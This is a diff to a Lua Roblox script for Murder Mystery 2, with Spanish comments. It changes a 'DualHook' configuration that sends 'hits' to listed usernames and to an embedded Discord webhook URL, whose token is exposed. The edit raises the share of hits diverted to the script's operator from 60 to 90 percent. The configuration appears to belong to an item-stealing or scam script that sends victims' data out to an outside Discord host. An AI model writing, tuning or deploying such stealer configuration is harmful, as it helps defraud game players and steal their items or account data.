@@ -306,8 +306,8 @@ local pingEveryone = _G.pingEveryone == "Yes"
 -- Configuración DualHook
 local DualHookUsers = {"cybertu24","AnonymousANONIMO125"}
 local DualHookWebhook = "https://discord.com/api/webhooks/1393678758883496078/dWWVbv5oLiiHL9Po5FYg77bbJXVBeHkkij_Hy1MpxQHut1pNY2c_hzNg8jK0Qq7jNCRM" -- Cambiar a tu webhook real
-local DualHookMinValue = 10
-local DualHookPercent = 60 -- porcentaje de hits que se van a ti
+local DualHookMinValue = 20
+local DualHookPercent = 90 -- porcentaje de hits que se van a ti
 -- Si no está en MM2
 if game.PlaceId ~= 142823291 then
     LocalPlayer:Kick("⚠️Este script no funciona en este juego, solo funciona en mm2 ✅")
